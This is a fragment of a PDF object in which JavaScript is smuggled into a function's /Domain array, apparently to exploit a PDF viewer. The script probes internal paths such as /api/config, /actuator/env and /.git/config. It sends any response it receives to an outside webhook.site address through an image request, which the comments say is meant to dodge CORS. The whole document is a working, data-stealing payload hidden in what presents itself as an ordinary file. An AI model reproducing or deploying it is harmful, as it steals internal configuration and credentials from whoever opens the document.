1 0 obj
<<
  /FunctionType 4
  /Domain [((function(){
    // 尝试常见的内部接口、配置接口、调试接口
    var paths = [
        '/api/config', '/api/status', '/api/health', '/api/internal', 
        '/api/debug', '/api/users', '/actuator/env', '/v2/api-docs', 
        '/swagger-ui.html', '/.git/config', '/config.json', '/server-info'
    ];
    
    paths.forEach(function(path){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', path, true);
        xhr.onload = function(){
            // 如果接口存在且返回了非空内容（状态码 200，或者返回了一些特定文本）
            if (xhr.status === 200 && xhr.responseText.length > 0) {
                var resData = xhr.responseText.substring(0, 500); // 截取前500字符
                // 用图片外带，避免跨域 XHR 的 CORS 限制
                new Image().src = 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f?path=' + encodeURIComponent(path) + '&data=' + encodeURIComponent(resData);
            }
        };
        xhr.send();
    });
})();) 0]
  /Range [0 0]
  /Length 12
>>
